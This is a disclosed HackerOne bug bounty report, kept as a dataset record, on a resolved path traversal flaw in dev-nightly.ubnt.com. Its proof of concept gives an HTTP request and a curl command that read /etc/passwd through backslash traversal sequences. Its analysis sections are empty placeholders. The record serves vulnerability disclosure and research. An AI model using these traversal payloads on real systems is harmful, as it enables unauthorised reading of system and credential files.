---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '260420'
original_report_id: '260420'
title: '[dev-nightly.ubnt.com] Local File Reading'
weakness: Path Traversal
team_handle: ui
created_at: '2017-08-15T16:51:21.285Z'
disclosed_at: '2017-09-14T18:23:06.688Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 31
tags:
- hackerone
- path-traversal
---

# [dev-nightly.ubnt.com] Local File Reading

## Metadata

- HackerOne Report ID: 260420
- Weakness: Path Traversal
- Program: ui
- Disclosed At: 2017-09-14T18:23:06.688Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Description**
Reading files outside the web root via path traversal

**PoC**
```http
GET /..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd HTTP/1.1
Host: dev-nightly.ubnt.com
```
```
curl "https://dev-nightly.ubnt.com/..\..\..\etc\passwd"
```

**Result**
{F213057}

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
